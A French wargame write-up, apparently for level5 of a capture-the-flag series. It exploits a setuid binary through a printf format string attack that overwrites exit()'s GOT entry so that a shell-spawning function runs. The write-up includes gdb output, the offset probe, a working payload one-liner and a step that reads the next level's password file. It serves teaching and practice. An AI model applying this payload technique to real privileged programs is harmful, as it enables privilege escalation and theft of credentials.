## Comportement
- J'ai des droits `level5` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5*`
- En exécutant le binaire (`./level5`), on observe:
  - qu'il attend un input de notre part.
  - qu'il print notre input avant de quitter.
  - il ne segfault pas meme si l'input est long.


## Analyse
- Conmme dans les 2 exercices precedents, nous devons manipuler la fonction printf() en utilisant une "string format attack". Notre principale préoccupation ici est que les fonctions n() et o() ne `return` jamais. Elles `exit` directement. On ne peut pas overflow l'EIP, le programme va quitter avant.
- Par contre on peut reecrire l'adresse de `exit()` en la remplacant par l'adresse de `o()` qui appelle un shell. 


## Résolution
- On recupere l'adresse de `o()` => `0x080484a4`
  ```shell
    (gdb) info function o
    ...
    0x080484a4  o
    ...
    (gdb)
  ```
- On recupere l'adresse de `exit()` => `0x8049838`
  ```shell
    (gdb) disas exit
    ...
    Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:	jmp    *0x8049838
    ...
    (gdb)
  ```
- On doit print dans la memoire jusqu'a tomber sur la `exit()` => 4eme position
  ```shell
    python -c 'print "BBBB"+" %x"*5' | ./level5
    BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520
  ```
- On craft notre payload:
  - avec l'adresse d'`exit()` en little endian => `\x38\x98\x04\x08` (4 bytes)
  - avec l'adresse de `o()` en decimal, moins les 4 bytes de l'adresse d'`exit()` => `134513824`. On lutilise avec le modifier `%d` car sinon il serait trop long.
  ```shell
  python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/payload
  cat /tmp/payload - | ./level5
  ```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level6`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/user/level6/.pass`)
  - quitter le shell (`exit`)
  - et passer au level6 (`su level6`) en renseignant ce password.
